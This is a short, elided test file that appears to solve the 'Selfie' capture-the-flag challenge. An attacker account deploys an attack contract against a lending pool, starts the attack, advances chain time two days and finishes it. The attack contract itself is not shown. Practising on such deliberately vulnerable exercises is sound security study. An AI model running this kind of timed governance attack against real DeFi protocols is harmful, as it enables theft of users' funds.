...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackContract = await (await ethers.getContractFactory("WhySoDumb", attacker)).deploy(this.pool.address);

        // Start attack
        await (await attackContract.connect(attacker).startAttack()).wait();

        // Advance 2 days and finish attack
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await (await attackContract.connect(attacker).finishAttack()).wait();
    });
